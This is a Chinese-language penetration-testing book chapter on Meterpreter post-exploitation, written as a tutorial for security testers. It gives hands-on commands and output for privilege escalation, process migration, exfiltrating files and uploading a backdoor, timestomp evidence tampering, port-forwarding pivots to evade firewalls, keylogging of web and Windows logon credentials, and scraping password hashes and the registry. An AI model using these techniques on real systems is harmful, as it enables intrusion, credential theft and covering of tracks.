# 第五章：使用 Meterpreter 探索受损目标

在本章中，我们将涵盖以下内容：

+   分析 meterpreter 系统命令

+   特权升级和进程迁移

+   设置与目标的多个通信通道

+   Meterpreter 文件系统命令

+   使用 timestomp 更改文件属性

+   使用 meterpreter 网络命令

+   获取桌面和键盘记录

+   使用 scraper meterpreter 脚本

# 介绍

到目前为止，我们已经更加强调了前利用阶段，在这个阶段中，我们尝试了各种技术和利用来妥协我们的目标。在本章中，我们将更加强调后利用阶段——在我们利用目标机器之后我们可以做什么。Metasploit 提供了一个非常强大的后利用工具，名为 meterpreter，它为我们提供了许多功能，可以简化我们探索目标机器的任务。在前一章的绕过防病毒中，我们已经看到了 meterpreter 和后利用的使用。在本章中，我们将详细了解 meterpreter 以及如何将其用作后利用阶段的潜在工具。

我们一直在使用有效载荷来实现特定的结果，但它们有一个主要的缺点。有效载荷通过在受损系统中创建新进程来工作。这可能会触发防病毒程序的警报，并且很容易被捕获。此外，有效载荷仅限于执行 shell 可以运行的特定任务或执行特定命令。为了克服这些困难，meterpreter 应运而生。

**Meterpreter**是 Metasploit 的命令解释器，充当有效载荷，并通过使用内存 DLL 注入和本机共享对象格式来工作。它与被利用的进程上下文中工作，因此不会创建任何新进程。这使得它更加隐秘和强大。

让我们看一下 meterpreter 的功能。以下图表显示了加载 meterpreter 的简单逐步表示：

![介绍](img/7423_05_01.jpg)

在第一步中，利用和第一阶段的有效载荷被发送到目标机器。在利用之后，分段器将自身绑定到具有特定任务的目标，并尝试连接到攻击的`msfconsole`，并建立适当的通信通道。现在，分段器加载 DLL。`msfconsole`并发送第二阶段 DLL 注入有效载荷。成功注入后，MSF 发送 meterpreter DLL 以建立适当的通信通道。最后，meterpreter 加载扩展，如`stdapi`和`priv`。所有这些扩展都是使用 TLS/1.0 和 TLV 协议加载的。Meterpreter 使用加密通信与目标用户，这是使用它的另一个主要优势。让我们快速总结 meterpreter 相对于特定有效载荷的优势：

+   它与被利用的进程上下文中工作，因此不会创建新进程

+   它可以在进程之间轻松迁移

+   它完全驻留在内存中，因此不会在磁盘上写入任何内容

+   它使用加密通信

+   它使用通道化的通信系统，因此我们可以同时使用多个通道

+   它提供了一个快速而轻松地编写扩展的平台

本章完全致力于使用 meterpreter 提供的各种命令和脚本来探索目标机器。我们将从分析常见的 meterpreter 命令开始。然后，我们将继续设置不同的通信通道，使用网络命令，键盘记录等。最后，我们将讨论 scraper meterpreter 脚本，它可以创建一个包含有关目标用户的各种信息的单个目录。在本章中，我们将主要关注那些可以帮助探索受损系统的命令和脚本。

所以让我们继续深入研究 meterpreter 的方法。

# 分析 meterpreter 系统命令

让我们开始使用 meterpreter 命令来了解它们的功能。由于它是一个后期利用工具，我们将需要一个受损的目标来执行命令。我们将使用一个已经利用了浏览器漏洞的 Windows 7 机器作为目标。您可以参考第四章中的*Internet Explorer CSS 递归调用内存损坏*配方，了解更多详情。

## 准备就绪

在入侵 Windows 7 目标机器后，我们将启动一个 meterpreter 会话，因为我们使用了`windows/meterpreter/bind_tcp`有效载荷。我们将首先使用一个简单的`?`命令，它将列出所有可用的 meterpreter 命令，以及简短的描述：

```
meterpreter > ? 
```

快速浏览整个列表。许多命令都是不言自明的。

## 如何做...

让我们从一些有用的系统命令开始。

+   background：此命令用于将当前会话设置为后台，以便在需要时再次使用。当有多个活动的 meterpreter 会话时，此命令很有用。

+   getuid：此命令返回正在运行的用户名，或者我们已经进入的目标机器上的用户名。

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD 
```

+   getpid：此命令返回我们当前运行 meterpreter 的进程 ID。

```
meterpreter > getpid
Current pid: 4124 
```

+   ps：此命令将列出目标机器上所有正在运行的进程。此命令有助于识别目标上运行的各种服务和软件。

```
meterpreter > ps
PID Name Arch Session User
--- ---- ------- ----
0 [System Process]
1072 svchost.exe
1172 rundll32.exe x86 1 DARKLORD-PC\DARKLORD 
```

+   sysinfo：这是一个方便的命令，可以快速验证系统信息，如操作系统和架构。

```
meterpreter > sysinfo
Computer : DARKLORD-PC
OS : Windows 7 (Build 7264).
Architecture : x86
System Language : en_US
Meterpreter : x86/win32 
```

+   shell：此命令将我们带入一个 shell 提示符。我们已经在一些先前的配方中看到了这个 meterpreter 命令的用法。

```
meterpreter > shell
Process 4208 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7264]
Copyright (c) 2009 Microsoft Corporation. All rights reserved. 
```

+   退出：此命令用于终止 meterpreter 会话。此命令也可用于终止 shell 会话并返回到 meterpreter。

这些是一些有用的系统命令，可用于探索受损目标以获取更多信息。还有许多其他命令，我留给您去尝试和探索。您可能已经注意到，使用 meterpreter 命令并探索目标是多么容易，而如果没有它，这将是一项困难的任务。在我们的下一个配方中，我们将专注于一些高级的 meterpreter 命令。

## 工作原理...

Meterpreter 的工作方式类似于任何命令解释器。它旨在通过命令理解和响应各种参数调用。它驻留在被利用/受损的进程的上下文中，并与渗透测试人员的机器创建客户端/服务器通信系统。

![工作原理...](img/7423_05_02.jpg)

前面的图表简要展示了 meterpreter 的功能。一旦建立通信通道，我们就可以向 meterpreter 服务器发送命令调用，以便将其响应发送回我们的机器。随着本章的深入，我们将更详细地了解渗透测试机器与受损目标之间的通信。

# 特权升级和进程迁移

在这个配方中，我们将专注于 meterpreter 的两个非常有用的命令。第一个是**特权升级**。此命令用于提升目标系统上的权限/权限。我们可能以较低权限的用户身份进入系统。因此，我们可以提升我们的特权以成为系统管理员，以便在执行任务时不受干扰。第二个命令是**进程迁移**。此命令用于在不在磁盘上写入任何内容的情况下从一个进程迁移到另一个进程。

## 如何做...

为了提升我们的特权，meterpreter 为我们提供了`getsystem`命令。此命令会自动开始寻找各种可能的技术，通过这些技术，用户的权限可以提升到更高级别。让我们分析`getsystem`命令使用的不同技术：

```
meterpreter > getsystem -h
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
-t <opt> The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)
4 : Exploit - KiTrap0D (In Memory/User) 
```

## 工作原理...

`getsystem`命令尝试在目标上提升特权的三种不同技术。默认值`0`尝试所有列出的技术，除非成功尝试。让我们快速看一下这些提升技术。

**命名管道**是一种机制，使应用程序能够在本地或远程进行进程间通信。创建管道的应用程序称为管道服务器，连接到管道的应用程序称为管道客户端。**模拟**是线程能够在与拥有该线程的进程不同的安全上下文中执行的能力。模拟使服务器线程能够代表客户端执行操作，但在客户端的安全上下文的限制内。当客户端拥有的权限超过服务器时，就会出现问题。这种情况将创建一个称为**命名管道模拟**提升攻击的特权提升攻击。

### 注意

有关命名管道模拟的详细文章可以在[`hackingalert.blogspot.com/2011/12/namedpipe-impersonation-attacks.html`](http://hackingalert.blogspot.com/2011/12/namedpipe-impersonation-attacks.html)找到。

操作系统的每个用户都有一个唯一的令牌 ID。该 ID 用于检查系统中各个用户的权限级别。令牌复制是通过低特权用户复制高特权用户的令牌 ID 来实现的。然后，低特权用户会以与高特权用户类似的方式行事，并且具有与高特权用户相同的所有权利和权限。

KiTrapOD 漏洞于 2010 年初发布，影响了微软此前制作的几乎所有操作系统。在 32 位 x86 平台上启用对 16 位应用程序的访问时，它没有正确验证某些 BIOS 调用。这允许本地用户通过构造**线程环境块（TEB）**中的`VDM_TIB`数据结构，来利用`#GP`陷阱处理程序（nt!KiTrap0D），也就是“Windows 内核异常处理程序漏洞”，来获取特权。

现在我们已经了解了`getsystem`命令使用的各种提升技术，我们的下一步将是在目标上执行该命令，看看会发生什么。首先，我们将使用`getuid`命令来检查我们当前的用户 ID，然后我们将尝试使用`getsystem`命令来提升我们的特权：

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM 
```

正如您所看到的，以前我们是一个特权较低的用户，使用`getsystem`命令后，我们将特权提升为系统用户。

我们将讨论的下一个重要的 meterpreter 命令是`migrate`命令。该命令用于从一个进程上下文迁移到另一个进程上下文。在当前进程可能崩溃的情况下，该命令非常有用。例如，如果我们使用浏览器漏洞渗透系统，那么在利用后浏览器可能会挂起，用户可能会关闭它。因此，迁移到稳定的系统进程可以帮助我们顺利进行渗透测试。我们可以使用进程 ID 迁移到任何其他活动进程。`ps`命令可用于标识所有活动进程的 ID。例如，如果`explorer.exe`的 ID 是`2084`，那么我们可以通过执行以下命令迁移到`explorer.exe`：

```
meterpreter > migrate 2084
[*] Migrating to 2084...
[*] Migration completed successfully. 
```

这两个 meterpreter 命令非常方便，并且在渗透测试期间经常使用。它们的简单性和高生产力使它们非常适合使用。在我们的下一个示例中，我们将处理通信渠道以及如何有效地使用它们与目标进行通信。

# 与目标建立多个通信渠道

在这个教程中，我们将看看如何为与目标通信建立多个频道。我们在本章的介绍中讨论了 meterpreter 中客户端和服务器之间的通信是加密的，并且它使用**类型-长度-值（TLV）**协议进行数据传输。使用 TLV 的主要优势在于它允许将数据与特定的频道号标记，从而允许受害者上运行的多个程序与攻击机上的 meterpreter 进行通信。这有助于同时建立多个通信频道。

让我们现在分析如何使用 meterpreter 与目标机器建立多个通信频道。

## 准备工作

Meterpreter 提供了一个名为`execute`的特定命令，可以用于启动多个通信频道。首先，让我们运行`execute -h`命令，查看可用选项：

```
meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.
OPTIONS:
-H Create the process hidden from view.
-a <opt> The arguments to pass to the command.
-c Channelized I/O (required for interaction).
-d <opt> The 'dummy' executable to launch when using -m.
-f <opt> The executable command to run.
-h Help menu.
-i Interact with the process after creating it.
-k Execute process on the meterpreters current desktop
-m Execute from memory.
-s <opt> Execute process in a given session as the session user
-t Execute process with currently impersonated thread token 
```

您可以看到`execute`命令提供给我们的各种参数。让我们使用其中一些参数来设置多个频道。

## 如何做...

要开始创建频道，我们将使用`execute`命令的`-f`运算符：

```
meterpreter > execute -f notepad.exe -c
Process 5708 created.
Channel 1 created. 
```

注意不同参数的使用。`-f`参数用于设置可执行命令，`-c`运算符用于设置通道化 I/O。现在我们可以再次运行 execute 命令，启动另一个频道，而不终止当前频道：

```
meterpreter > execute -f cmd.exe -c
Process 4472 created.
Channel 2 created.
meterpreter > execute -f calc.exe -c
Process 6000 created.
Channel 3 created. 
```

现在我们在受害者机器上同时运行了三个不同的频道。要列出可用的频道，我们可以使用`channel -l`命令。如果我们想要发送一些数据或在频道上写入一些内容，我们可以使用`write`命令，后面跟着我们想要写入的频道 ID。让我们继续在我们的一个活动频道中写入一条消息：

```
meterpreter > write 5
Enter data followed by a '.' on an empty line:
Metasploit!!
.
[*] Wrote 13 bytes to channel 5. 
```

执行`write`命令以及频道 ID，提示我们输入数据，然后输入一个句号。我们成功地在频道上写入了`Metasploit!!`。为了读取任何频道的数据，我们可以使用`read`命令，后面跟着频道 ID。

此外，如果我们想要与任何频道交互，我们可以使用`interact`命令，后面跟着频道 ID：

```
meterpreter > interact 2
Interacting with channel 2...
Microsoft Windows [Version 6.1.7264]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\DARKLORD\Desktop> 
```

您可以看到我们的频道 2 是一个命令提示符频道，因此通过使用`interact`命令，我们直接进入了命令提示符模式，从那里我们可以执行系统命令。我们可以通过使用`interact`命令轻松地在频道之间切换。为了结束一个频道，我们可以使用`close`命令，后面跟着频道 ID。

这个教程演示了使用多个频道的强大功能。它还展示了同时管理它们和在不同频道之间切换有多么容易。当我们在目标机器上运行多个服务时，使用频道变得很重要。

在下一个教程中，我们将专注于使用 meterpreter 探索目标机器的文件系统。

## 它是如何工作的...

Metasploit 使用单独的频道 ID 为每条消息打上标签，这有助于识别应在其中执行特定命令的频道上下文。正如前面所述，meterpreter 中的通信过程遵循 TLV 协议，这使得可以使用特定的频道 ID 为不同的消息打上标签，以提供多频道通信支持的灵活性。

# Meterpreter 文件系统命令

在这个教程中，我们将继续使用文件系统命令。这些命令可以帮助我们探索目标系统，执行各种任务，比如搜索文件、下载文件和更改目录。您会注意到使用 meterpreter 轻松控制目标机器有多么容易。让我们开始使用一些有用的文件系统命令。

## 如何做...

我们将从简单的`pwd`命令开始，该命令列出了我们在目标机器上的当前工作目录。同样，我们可以使用`cd`命令将我们的工作目录更改为我们喜欢的位置：

```
meterpreter > pwd
C:\Users\DARKLORD\Desktop
meterpreter > cd c:\
meterpreter > pwd
c:\ 
```

正如您所看到的，我们首先使用`pwd`命令列出了我们的工作目录，然后使用`cd`命令将我们的工作目录更改为“c：”。我们还可以使用`ls`命令列出当前目录中可用的文件。

既然我们可以使用目录，我们的下一个任务将是在驱动器上搜索文件。浏览每个目录和子目录以寻找文件将非常乏味。我们可以使用`search`命令快速搜索特定文件类型。考虑以下示例：

```
meterpreter > search -f *.doc -d c:\ 
```

该命令将搜索`C`驱动器中具有`.doc`作为文件扩展名的所有文件。使用`f`参数指定要搜索的文件模式，`d`参数告诉要搜索哪个文件的目录。

所以一旦我们搜索到我们特定的文件，我们可以做的下一件事是将文件下载到目标机器上。让我们首先尝试将文件下载到我们的攻击系统：

```
meterpreter > download d:\secret.doc /root
[*] downloading: d:secret.doc -> /root/d:secret.doc
[*] downloaded : d:secret.doc -> /root/d:secret.doc 
```

通过使用`download`命令，我们可以成功地从目标机器下载任何文件到我们的机器。 “d：\secret.doc”文件在我们的攻击机器的`root`文件夹中下载。

同样，我们可以使用`upload`命令将任何文件发送到目标机器：

```
meterpreter > upload /root/backdoor.exe d:\
[*] uploading : /root/backdoor.exe -> d:\
[*] uploaded : /root/backdoor.exe -> d:\\backdoor.exe 
```

最后，我们可以使用`del`命令从目标机器中删除文件或目录。

```
meterpreter > del d:\backdoor.exe 
```

## 它是如何工作的...

Meterpreter 通过设置交互式命令提示符为我们提供对目标机器的完全访问。我们还可以放置一个 shell 会话以在默认的 Windows DOS 模式下工作，但它不会有太多功能。这是对 meterpreter 的一些重要文件系统命令的快速参考，可以帮助我们探索目标机器上的文件。还有更多的命令；建议您应该尝试它们，并找出可能存在的各种可能性。

在下一个步骤中，我们将看到一个非常有趣的 meterpreter 命令，称为`timestomp`，它可以用于修改目标机器上的文件属性。

# 使用 timestomp 更改文件属性

在上一个步骤中，我们了解了一些重要且有用的 meterpreter 文件系统命令，可用于在目标机器上执行各种任务。 Meterpreter 还包含另一个有趣的命令，称为`timestomp`。此命令用于更改文件的**修改-访问-创建-输入（MACE）**属性。属性值是文件发生任何 MACE 活动的日期和时间。使用`timestomp`命令，我们可以更改这些值。

## 准备就绪

在开始配方之前，可能会有一个问题在你的脑海中出现。为什么要更改 MACE 值？黑客通常使用更改 MACE 值的技术，以使目标用户感到文件已经存在系统很长时间，并且没有被触摸或修改。在可疑活动的情况下，管理员可能会检查最近修改的文件，以查找是否已修改或访问任何文件。因此，使用此技术，文件将不会出现在最近访问或修改项目的列表中。即使还有其他技术可以找出文件属性是否已被修改，这种技术仍然很有用。

让我们从目标机器中挑选一个文件并更改其 MACE 属性。以下屏幕截图显示了在使用“timestomp”之前文件的各种 MACE 值：

![准备就绪](img/7423_05_03.jpg)

现在我们将继续前进，更改各种 MACE 值。让我们从常见的`timestomp -h`命令开始，该命令用于列出各种可用选项。我们可以使用`-v`运算符列出 MACE 属性的值：

```
meterpreter > timestomp d:\secret.doc v
Modified : 2011-12-12 16:37:48 +0530
Accessed : 2011-12-12 16:37:48 +0530
Created : 2011-12-12 16:37:47 +0530
Entry Modified: 2011-12-12 16:47:56 +0530 
```

## 如何做...

我们将从更改文件的创建时间开始。注意使用`timestomp`命令传递的各种参数：

```
meterpreter > timestomp d:\secret.doc -c "3/13/2013 13:13:13"
[*] Setting specific MACE attributes on d:secret.doc 
```

## 它是如何工作的...

`-c`运算符用于更改文件的创建时间。同样，我们可以使用`-m`和`-a`运算符来更改文件的修改和最后访问属性：

```
meterpreter > timestomp d:\secret.doc -m "3/13/2013 13:13:23"
[*] Setting specific MACE attributes on d:secret.doc
meterpreter > timestomp d:\secret.doc -a "3/13/2013 13:13:33"
[*] Setting specific MACE attributes on d:secret.doc 
```

属性更改后，我们可以再次使用`-v`运算符来检查和验证我们是否成功执行了命令。让我们继续检查文件属性：

```
meterpreter > timestomp d:\secret.doc v
Modified : 2013-03-13 13:13:13 +0530
Accessed : 2013-03-13 13:13:23 +0530
Created : 2013-03-13 13:13:33 +0530
Entry Modified: 2013-03-13 13:13:13 +0530 
```

太棒了！我们已成功修改了文件的 MACE 属性。现在这个文件可以很容易地从最近修改或最近访问文件的列表中隐藏起来。

或者，我们也可以使用`-z`运算符一次性更改所有四个 MACE 值。我们不必为每个值单独传递命令。但是`-z`运算符会将相同的值分配给所有四个 MACE 属性，这在实际上是不可能的。创建和访问时间之间必须有一些时间差。因此，应避免使用`-z`运算符。

这是一个处理`timestomp`实用程序的小技巧。在下一个技巧中，我们将看一些有用的 Meterpreter 网络命令，当我们了解枢纽转移时，这些命令将对我们非常有用。

# 使用 meterpreter 网络命令

Meterpreter 还为我们提供了一些有用的网络命令。这些命令对于了解目标用户的网络结构很有用。我们可以分析系统是属于局域网还是独立系统。我们还可以了解 IP 范围、DNS 和其他信息。在进行枢纽转移时，这些网络信息可能很有用。枢纽转移是一个概念，通过它我们可以攻击与我们的目标位于同一网络中的其他计算机。我们将在下一章中了解枢纽转移，重点是 Meterpreter 的高级用法。

## 做好准备

在我们进入这个技巧之前，有三个网络术语我们将在这里遇到。因此，让我们通过查看以下术语来快速回顾一下我们的记忆：

+   **子网**是将一个大网络划分为更小可识别部分的概念。子网划分是为了增加地址的实用性和安全性。

+   **子网掩码**是一个 32 位的掩码，用于将 IP 地址划分为子网并指定网络的可用主机。

+   **网关**指定了转发或下一跳 IP 地址，通过它可以到达由网络目的地和子网掩码定义的地址集。

当我们处理`route`命令时，我们将使用这三个术语。

## 如何做到...

Meterpreter 提供了三个网络命令。它们是`ipconfig`、`route`和`portfwd`。让我们快速看一下它们各自的功能。

`Ipconfig`命令用于显示目标机器的所有 TCP/IP 网络配置。它列出了目标 IP 地址、硬件 MAC 和子网掩码等信息：

```
meterpreter > ipconfig
Reliance
Hardware MAC: 00:00:00:00:00:00
IP Address : 115.242.228.85
Netmask : 255.255.255.255
Software Loopback Interface 1
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0 
```

正如你所看到的，`ipconfig`的输出列出了各种活动的 TCP/IP 配置。

下一个网络命令是`route`命令。它类似于 MS DOS 的`route`命令。该命令用于显示或修改目标机器上的本地 IP 路由表。执行`route`命令会列出当前的表格：

```
meterpreter > route
Network routes
==============
Subnet Netmask Gateway
------ ------- -------
0.0.0.0 0.0.0.0 115.242.228.85
115.242.228.85 255.255.255.255 115.242.228.85
127.0.0.0 255.0.0.0 127.0.0.1
127.0.0.1 255.255.255.255 127.0.0.1
127.255.255.255 255.255.255.255 127.0.0.1
192.168.56.0 255.255.255.0 192.168.56.1
192.168.56.1 255.255.255.255 192.168.56.1
192.168.56.255 255.255.255.255 192.168.56.1
224.0.0.0 240.0.0.0 127.0.0.1
224.0.0.0 240.0.0.0 192.168.56.1
224.0.0.0 240.0.0.0 115.242.228.85
255.255.255.255 255.255.255.255 127.0.0.1
255.255.255.255 255.255.255.255 192.168.56.1
255.255.255.255 255.255.255.255 115.242.228.85 
```

让我们执行`route -h`命令，看看我们如何修改表格。

```
meterpreter > route -h
Usage: route [-h] command [args]
Supported commands:
add [subnet] [netmask] [gateway]
delete [subnet] [netmask] [gateway] 
```

如果你看一下`ipconfig`命令的输出，你会发现 IP 地址`115.242.228.85`是目标用来连接互联网的。因此，我们可以添加一个路由值，通过`115.242.228.85`作为网关传递连接。这可以为我们提供目标机器上的防火墙绕过：

```
meterpreter > route add 192.168.56.2 255.255.255.255 192.168.56.1
Creating route 192.168.56.2/255.255.255.255 -> 192.168.56.1 
```

同样，我们可以使用`delete`命令从表中删除路由。

让我们转到最后一个网络命令——`portfwd`。这个命令用于将传入的 TCP 和/或 UDP 连接转发到远程主机。考虑以下示例以了解端口转发。

考虑主机“A”、主机“B”（中间）和主机“C”。主机 A 应该连接到主机 C 以执行某些操作，但如果由于任何原因不可能，主机 B 可以直接连接到 C。如果我们在中间使用主机 B，从 A 获取连接流并将其传递到 B，同时处理连接，我们称主机 B 正在进行**端口转发**。

这就是数据包在传输中的样子：主机 B 正在运行一个软件，该软件在其端口之一上打开 TCP 监听器，比如端口 20。主机 C 也在运行一个监听器，用于在从端口 20 到达时连接到主机 B。因此，如果 A 在 B 的 20 号端口上发送任何数据包，它将自动转发到主机 C。因此，主机 B 正在将其数据包端口转发到主机 C。

## 它是如何工作的...

要与远程主机开始端口转发，我们可以首先添加一个转发规则。考虑以下命令行：

```
Meterpreter> portfwd -a -L 127.0.0.1 -l 444 -h 69.54.34.38 -p 3389 
```

注意不同的命令参数。使用`-a`参数，我们可以添加一个新的端口转发规则。`-L`参数定义要将转发套接字绑定到的 IP 地址。由于我们都在主机 A 上运行这些命令，并且希望从同一主机继续工作，我们将 IP 地址设置为`127.0.0.1`。

`-l`是主机 A 上将打开的端口号，用于接受传入连接。`-h`定义了主机 C 的 IP 地址，或者内部网络中的任何其他主机。`-p`是您要连接到的主机 C 上的端口。

这是使用端口转发的简单演示。这种技术被积极用于绕过防火墙和入侵检测系统。

# 获取桌面和按键嗅探

在这个示例中，我们将处理与桌面和按键嗅探相关的一些`stdapi`用户界面命令。捕获按键取决于当前活动的桌面，因此了解我们如何通过切换到不同桌面活动会话中运行的进程来嗅探不同的按键是至关重要的。让我们继续深入了解这个示例。

## 如何做...

让我们开始执行一些用户界面命令，这些命令是我们在这个示例中将主要处理的。它们如下：

+   `enumdesktops:`此命令将列出所有可访问的桌面和窗口站点。

```
meterpreter > enumdesktops
Enumerating all accessible desktops
Desktops
========
Session Station Name
------- ------- ----
0 WinSta0 Default
0 WinSta0 Disconnect
0 WinSta0 Winlogon
0 SAWinSta SADesktop 
```

在这里，您可以看到所有可用的桌面站点都与会话 0 相关联。我们将很快看到我们所说的会话 0 的确切含义。

+   `getdesktop:`此命令返回我们的 meterpreter 会话正在工作的当前桌面。

```
meterpreter > getdesktop
Session 0\Service-0x0-3e7$\Default 
```

您可以将`getdesktop`命令的输出与`enumdesktops`相关联，以了解我们正在工作的当前桌面站点的情况。

+   `setdesktop:`此命令用于将当前的 meterpreter 桌面更改为另一个可用的桌面站点。

+   `keyscan_start:`此命令用于在当前活动的桌面站点中启动按键嗅探器。

+   `keyscan_dump:`此命令会转储活动 meterpreter 桌面会话的记录按键。

现在让我们分析这些命令在实时场景中的工作方式，以及我们如何通过不同的桌面站点嗅探按键。

## 它是如何工作的...

在我们继续进行示例之前，有一个关于 Windows 桌面的重要概念需要我们了解。

Windows 桌面被划分为不同的**会话**，以定义我们与 Windows 机器交互的方式。会话 0 代表控制台。其他会话——会话 1、会话 2 等代表远程桌面会话。

因此，为了捕获我们侵入的系统的按键，我们必须在桌面会话 0 中工作：

![它是如何工作的...](img/7423_05_04.jpg)

每个 Windows 桌面会话包括不同的站。在前面的图中，您可以看到与 Session 0 相关的不同站。在这些站中，WinSta0 是唯一的交互式站。这意味着用户只能与 WinSta0 站互动。所有其他站都是非交互式的。现在 WinSta0 包括三个不同的桌面，即 Default、Disconnect 和 Winlogon。默认桌面与我们在桌面上执行的所有应用程序和任务相关联。`Disconnect`桌面与屏幕保护程序锁定桌面有关。Winlogon 桌面与 Windows 登录屏幕有关。

这里需要注意的一点是每个桌面都有自己的键盘缓冲区。因此，如果您必须从`Default`桌面中嗅探按键记录，您必须确保您当前的 meterpreter 活动浏览器设置为`Session 0/WinSta0/Default`。如果您必须嗅探登录密码，那么您将不得不将活动桌面更改为`Session 0/WinSta0/Winlogon`。让我们举个例子来让它更清楚。

让我们使用`getdesktop`命令检查我们当前的桌面：

```
meterpreter > getdesktop
Session 0\Service-0x0-3e7$\Default 
```

正如您所看到的，我们不在`WinSta0`站，这是唯一的交互式桌面站。因此，如果我们在这里运行按键捕获，它不会返回任何结果。让我们将我们的桌面更改为`WinSta0\Default`：

```
meterpreter > setdesktop
Changed to desktop WinSta0\Default
meterpreter > getdesktop
Session 0\WinSta0\Default 
```

前面的命令行显示我们使用`setdesktop`命令切换到了交互式 Windows 桌面站。因此，现在我们已经准备好运行按键记录嗅探器来捕获用户在目标机器上按下的按键：

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
gmail.com <Return> daklord <Tab> 123123 
```

查看转储的按键记录，您可以清楚地识别出目标用户访问了[gmail.com](http://gmail.com)并输入了他的凭据进行登录。

如果您想嗅探 Windows 登录密码怎么办？显然，您可以使用`setdesktop`命令将您的活动桌面切换到`WinSta0\Winlogon`，但在这里我们也将讨论另一种方法。我们可以迁移到在 Windows 登录期间运行的进程。让我们执行`ps`命令来检查正在运行的进程。

您会发现`winlogon.exe`作为一个带有进程 ID 的进程在运行。让我们假设`winlogon.exe`的**进程 ID（PID）**为`1180`。现在让我们迁移到这个 PID 并再次检查我们的活动桌面：

```
meterpreter > migrate 1180
[*] Migrating to 1180...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Winlogon 
```

您可以看到我们的活动桌面已更改为`WinSta0\Winlogon`。现在我们可以运行`keyscan_start`命令来开始嗅探 Windows 登录屏幕上的按键记录。

同样，我们可以通过迁移到运行在默认桌面上的任何进程来返回到默认桌面。考虑使用 PID `884`的`explorer.exe`：

```
meterpreter > migrate 884
[*] Migrating to 884...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Default 
```

您可能已经注意到了迁移到不同进程和桌面环境以嗅探按键记录的重要性。通常，人们在直接运行`keyscan`而不查看当前活动桌面时得不到任何结果。这是因为他们渗透的进程可能属于不同的会话或站。因此，在使用按键记录嗅探时，请牢记桌面的概念。

# 使用刮削器 meterpreter 脚本

到目前为止，我们已经了解了几个 meterpreter 命令。在这里，我们将看一下一个重要的 meterpreter 脚本，它可以帮助我们更深入地探索目标。下一章将广泛涵盖 meterpreter 脚本，因此在这里我们将专注于使用脚本。在渗透测试期间，您可能需要大量时间来挖掘目标的信息。因此，对于渗透测试人员来说，拥有有用信息的本地备份可以真正方便，即使目标已经关闭，他们仍然有信息可以使用。它还使与其他测试人员共享信息变得容易。刮削器为我们完成了这项任务。

## 准备工作

使用刮削器 meterpreter 脚本可以挖掘有关受损目标的大量信息，例如注册表信息、密码哈希和网络信息，并将其存储在测试人员的本地机器上。

为了在目标上使用 meterpreter 执行 Ruby 脚本，我们可以使用`run`命令。执行`run scraper -h`命令将列出我们可以与脚本一起传递的各种可用参数。让我们继续分析如何可以在本地下载信息。

## 如何做到这一点...

脚本在执行后会自动完成所有操作。它在`/root/.msf4/logs/scripts/scraper`下创建一个目录，其中保存了所有文件。您可能会在脚本执行过程中注意到错误，这可能是因为某个命令在目标上执行失败（命令行输出已经被缩短以适应）：

```
meterpreter > run scraper
[*] New session on 192.168.56.1:4232...
[*] Gathering basic system information...
[*] Error dumping hashes: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU (C:\Users\DARKLORD\AppData\Local\Temp\UKWKdpIb.reg) 
```

脚本会自动下载并保存信息到目标文件夹。让我们看一下源代码，分析是否可以根据我们的需求进行一些更改。

## 它是如何工作的...

`scraper.rb`的源代码位于`/pentest/exploits/framework3/scripts/meterpreter`下。

Ruby 编程经验可以帮助您编辑脚本以添加您自己的功能。我们可以通过编辑以下行来更改下载位置：

```
logs = ::File.join(Msf::Config.log_directory, 'scripts','scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) ) 
```

假设您还想获取可用进程列表的结果，那么您可以简单地在程序的主体中添加以下代码行：

```
::File.open(File.join(logs, "process.txt"), "w") do |fd|
fd.puts(m_exec(client, "tasklist"))
end 
```

通过使用一点点 Ruby 语言和代码重用，您可以轻松修改代码以适应您的需求。

## 还有更多...

让我们了解另一个可以用于从目标机器收集信息的 meterpreter 脚本。

### 使用 winenum.rb

`winenum.rb`是另一个 meterpreter 脚本，可以帮助您收集有关目标的信息并在本地下载。它的工作方式类似于`scraper.rb`。您也可以尝试使用这个脚本，看看它可以提供什么额外的信息。该脚本可以在以下位置找到：

`/pentest/exploits/framework3/scripts/meterpreter/winenum.rb`
